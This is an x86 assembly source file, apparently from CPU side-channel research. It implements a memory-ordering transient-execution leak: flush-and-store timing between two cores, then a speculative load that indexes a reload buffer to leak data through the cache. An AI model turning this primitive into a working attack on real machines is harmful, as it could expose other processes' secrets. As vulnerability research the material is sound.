%include "common.S"

%define MO_OFF  

section .data noexec write
    align 256
    trigger:    dq  0x0

    align 256
    x:          dq  0x0
    
    align 256
    y:          dq  0x0


section .text
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; mo_win_size_trigger(void)
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
global mo_win_size_trigger
mo_win_size_trigger:
    GET_LOCK   trigger 
    mov     QWORD [y], LEAK_SIZE*STRIDE-4*STRIDE
    sfence
    ret


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; mo_win_size(uint8_t *reload_buffer)
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
global mo_win_size
mo_win_size:
    push    r15
    lea     r15, [x]

    ;reset
    mov     qword [x], 0
    mov     qword [y], 0
    clflush [x]             ;slow x
    mov     rax, qword [y]  ;fast y
    SERIALIZE

    ;ensure that store loop is in busy waiting
mo_win_size_ensure:
    cmp     dword [trigger], 0
    je      mo_win_size_go
    pause
    jmp     mo_win_size_ensure

mo_win_size_go:
    RELEASE_LOCK    trigger     ;Trigger the other core to perform the store on y

    %rep 150                ;TWEAK
    imul r15, 1
    %endrep
    mov     rdx, qword  [r15]
    mov     rax, qword  [y]

    add     rdi, rax
    LOADS   rdi

    pop     r15
    ret



;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; mo_leak_trigger(void)
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
global mo_leak_trigger
mo_leak_trigger:
    GET_LOCK   trigger 
    mov     QWORD [y], LEAK_SIZE*STRIDE
    sfence
    ret


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; mo_leak(uint8_t *reload_buffer, uint8_t *leak_ptr)
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
global mo_leak
mo_leak:
    push    r15
    lea     r15, [x]

    ;reset
    mov     qword [x], 0
    mov     qword [y], 0
    clflush [x]             ;slow x
    mov     rax, qword [y]  ;fast y
    SERIALIZE

    ;ensure that store loop is in busy waiting
mo_leak_ensure:
    cmp     dword [trigger], 0
    je      mo_leak_go
    pause
    jmp     mo_leak_ensure

mo_leak_go:
    RELEASE_LOCK    trigger     ;Trigger the other core to perform the store on y

    %rep 150                ;TWEAK
    imul r15, 1
    %endrep
    mov     rdx, qword  [r15]
    mov     rax, qword  [y]

    add     rdi, rax
    LEAK    rdi, rsi 

    pop     r15
    ret
